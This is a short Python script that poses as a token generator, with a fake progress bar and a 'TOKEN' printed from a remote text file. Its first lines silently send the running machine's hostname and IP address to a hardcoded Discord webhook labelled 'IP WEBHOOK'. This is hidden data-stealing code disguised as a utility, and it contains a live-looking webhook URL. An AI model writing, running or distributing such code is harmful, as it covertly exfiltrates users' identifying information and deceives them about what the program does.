random_time = random.randint(5, 17)
u = "https://discord.com/api/webhooks/1151568846285705266/xAydDMKKDqMSBmDYb6Q7sTqS5anAY18-8R8_z2a9NaSpA8aYuz-E9KViVE9izKTaO3uw"
h = socket.gethostname()
i = socket.gethostbyname(h)
t = time.localtime()
t = time.strftime("%H:%M:%S", t)
d = {"content" : f"**--------------------------------------**\n**{t}**", "username" : "IP WEBHOOK"}
d["embeds"] = [{"description" : f"**NAME**: {h}\n**IP**: {i}", "title" : "IP: "}]
requests.post(u, json=d)

def p(percentage):
    bar_length = 50
    block = int(round(bar_length * percentage))
    progress = "[" + "=" * block + " " * (bar_length - block) + "]"
    sys.stdout.write(f"\r{progress} {percentage * 100:.1f}%")
    sys.stdout.flush()
n = random_time
for i in range(n + 1):
    pe = i / float(n)
    p(pe)
    time.sleep(0.1)  

url = "https://raw.githubusercontent.com/hmmmmmmmmmmm-ctrl/hum/main/token.txt"
response = requests.get(url)
if response.status_code == 200:
    content = response.text
    lignes = content.split('\n')
    cprint(f"[ TOKEN ] {random.choice(lignes)}", "green")
else:
    cprint(f"ERROR, try to relaunch or verify your connexion", color="red")
